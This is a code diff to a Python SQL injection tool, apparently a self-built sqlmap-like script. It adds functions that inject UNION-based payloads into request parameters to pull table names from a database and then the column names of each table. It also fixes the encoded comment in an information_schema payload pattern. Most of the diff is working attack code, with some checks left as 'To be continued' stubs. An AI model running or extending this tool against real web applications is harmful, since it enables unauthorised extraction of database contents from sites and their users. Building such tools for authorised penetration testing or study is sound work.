@@ -60,7 +60,7 @@ extraction_patterns = {
 		},
 		"column_names": {
 			"key": "column_name",
-			"from": "FROM information_schema.columns WHERE table_name='$TABLE_NAME'--$20"
+			"from": "FROM information_schema.columns WHERE table_name='$TABLE_NAME'--%20"
 		},
 		"data_dump": {
 			"key": "$COLUMN_NAME",
@@ -360,7 +360,7 @@ def get_pattern_union(select_size: int, visible_index: int, key : str, from_valu
 
 
 # --------- DATA EXTRACTION --------- #
-def extract_data(method, url, headers, body, injection_point: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
+def extract_table_names(method, url, headers, body, injection_point: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
 	original_query_params = query_params(extract_query_string(url))
 	original_body_params = body_params(body)
 
@@ -377,10 +377,41 @@ def extract_data(method, url, headers, body, injection_point: str, db_type: str,
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
 			body_string(original_body_params), injection_point, "extraction", pattern_union)
-
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
-	lines = [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
-	print(f"[+] Extracted Table Names:\n{', '.join(lines)}\n")
+
+	# To be continued...
+	# Check for SQL errors
+
+	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
+
+def extract_column_names(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int):
+	original_query_params = query_params(extract_query_string(url))
+	original_body_params = body_params(body)
+
+	if db_type.lower() == "mysql":
+		extraction_steps = extraction_patterns["mysql"]["column_names"]
+	elif db_type.lower() == "sqlite":
+		extraction_steps = extraction_patterns["sqlite"]["column_names"]
+
+	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"]).replace("$TABLE_NAME", table_name)
+	print(pattern_union)
+	if injection_point in original_query_params:
+		original_query_params[injection_point] += pattern_union
+	elif injection_point in original_body_params:
+		original_body_params[injection_point] += pattern_union
+
+	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
+			body_string(original_body_params), injection_point, "extraction", pattern_union)
+	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
+
+
+	# To be continued...
+	# If DBMS is sqlite, parse the CREATE TABLE statement to extract column names
+
+	# To be continued...
+	# Check for SQL errors
+
+	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
 
 # ----------------------- #
 
@@ -401,10 +432,12 @@ def main():
 			print_record(record, i, only_new_content, records["default"]["response"]["content"])
 		detection_records = parse_detection_records(records)
 		injection_points, db_type = get_injection_points(detection_records)
-		print("Injection Points:", injection_points)
+		print("Injection Points:", injection_points if injection_points else "None")
 		print("Database Type:", db_type)
 
 		for injection_point in injection_points:
+			print(f"[!] Starting extraction for parameter '{injection_point}'...\n")
+			
 			if not db_type:
 				print(f"[!] Cannot proceed with extraction for parameter '{injection_point}' as the database type is unknown.")
 				continue
@@ -419,7 +452,12 @@ def main():
 				print(f"[-] Could not determine the visible index for injection point '{injection_point}'.\n")
 				continue
 
-			extract_data(method, url, headers, body, injection_point, db_type, records["default"], visible_index, num_columns)
+			table_names = extract_table_names(method, url, headers, body, injection_point, db_type, records["default"], visible_index, num_columns)
+			print(f"[+] Extracted Table Names:\n{', '.join(table_names)}\n")
+
+			for table in table_names:
+				columns_names = extract_column_names(method, url, headers, body, injection_point, table, db_type, records["default"], visible_index, num_columns)
+				print(f"[+] Extracted Column Names for table '{table}':\n{', '.join(columns_names)}\n")
 
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
